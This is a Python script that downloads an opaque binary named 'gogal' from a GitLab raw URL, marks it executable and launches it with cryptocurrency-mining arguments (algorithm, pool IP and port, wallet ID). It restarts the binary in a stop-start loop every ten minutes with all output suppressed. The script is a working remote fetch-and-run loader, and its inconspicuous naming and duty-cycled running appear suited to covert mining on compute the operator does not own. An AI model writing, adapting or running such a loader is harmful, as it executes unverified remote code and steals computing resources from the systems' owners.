import requests
import os
import subprocess
import stat
import time
import sys

# --- Configuration ---
# You can easily change these values without touching the main script logic.

# URL to download the executable from
FILE_URL = "https://gitlab.com/senopvrtymlbb/data/-/raw/main/gogal"

# Local filename for the downloaded executable
FILENAME = "gogal"

# Command-line arguments for the executable
# It's recommended to replace the wallet address with your own.
COMMAND_ARGS = [
    f"./{FILENAME}",
    "-a", "xelishashv2",
    "-o", "51.195.26.234:7019",
    "-w", "krxX7GM33E.paperr", # <-- Your wallet address
    "--api-port", "8081"
]

# --- Timing Cycle (in seconds) ---

# The total duration of one full cycle (run + wait time)
# 10 * 60 = 10 minutes
TOTAL_CYCLE_DURATION = 10 * 60

# How long to wait before starting the process in each cycle
# 1 * 60 = 1 minute
PRE_RUN_WAIT = 1 * 60

# How long to wait after stopping the process in each cycle
# 1 * 60 = 1 minute
POST_RUN_WAIT = 1 * 60

# --- End of Configuration ---


def download_file(url, filename):
    """
    Downloads a file from a given URL.
    Returns True on success, False on failure.
    """
    print(f"Downloading {filename} from {url}...")
    try:
        with requests.get(url, stream=True, timeout=30) as response:
            response.raise_for_status()  # Raise an exception for bad status codes (4xx or 5xx)
            with open(filename, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
        print("Download successful.")
        return True
    except requests.exceptions.RequestException as e:
        print(f"Error downloading file: {e}", file=sys.stderr)
        return False

def run_command(command):
    """
    Runs a shell command in the background.
    Returns the process object on success, None on failure.
    """
    print(f"Running command: {' '.join(command)}")
    try:
        # Use Popen to run the command in the background without blocking
        process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return process
    except FileNotFoundError:
        print(f"Error: Command not found. Make sure '{command[0]}' exists and is executable.", file=sys.stderr)
        return None
    except Exception as e:
        print(f"An unexpected error occurred while running the command: {e}", file=sys.stderr)
        return None

def stop_process(process):
    """Stops a running process gracefully."""
    if not process:
        return
    print(f"Stopping process with PID: {process.pid}")
    try:
        process.terminate()  # Ask the process to terminate gracefully
        process.wait(timeout=10) # Wait up to 10 seconds for it to stop
        print("Process terminated.")
    except subprocess.TimeoutExpired:
        print("Process did not terminate in time, forcing kill.")
        process.kill()  # Force kill if it doesn't respond
        process.wait()
        print("Process killed.")
    except Exception as e:
        # Ignore other errors during termination
        print(f"Error during process termination: {e}", file=sys.stderr)


def main():
    """
    Main function to download, set permissions, and execute a process on a schedule.
    """
    # 1. Download the file if it doesn't exist
    if not os.path.exists(FILENAME):
        if not download_file(FILE_URL, FILENAME):
            return # Exit if download fails

    # 2. Set file permissions to make it executable
    # stat.S_IRWXU gives read, write, and execute permissions to the owner only (safer).
    try:
        print(f"Setting execute permissions for {FILENAME}.")
        os.chmod(FILENAME, stat.S_IRWXU)
    except Exception as e:
        print(f"Error setting file permissions: {e}", file=sys.stderr)
        return

    # 3. Calculate the actual run duration based on the cycle and wait times
    run_duration = TOTAL_CYCLE_DURATION - PRE_RUN_WAIT - POST_RUN_WAIT
    if run_duration <= 0:
        print("Error: The run duration is zero or negative. Adjust timing configuration.", file=sys.stderr)
        return

    print(f"Starting infinite loop. Run duration: {run_duration}s, Total cycle: {TOTAL_CYCLE_DURATION}s.")

    # 4. Start the infinite execution loop
    while True:
        print(f"Waiting for {PRE_RUN_WAIT} seconds before starting.")
        time.sleep(PRE_RUN_WAIT)

        process = run_command(COMMAND_ARGS)

        if process:
            try:
                print(f"Process started successfully. Running for {run_duration} seconds.")
                time.sleep(run_duration)
            finally:
                stop_process(process)
        else:
            print("Failed to start process. Waiting for the configured run duration before retrying.")
            time.sleep(run_duration) # Wait anyway to keep the cycle consistent

        print(f"Waiting for {POST_RUN_WAIT} seconds before next cycle.")
        time.sleep(POST_RUN_WAIT)


if __name__ == "__main__":
    main()
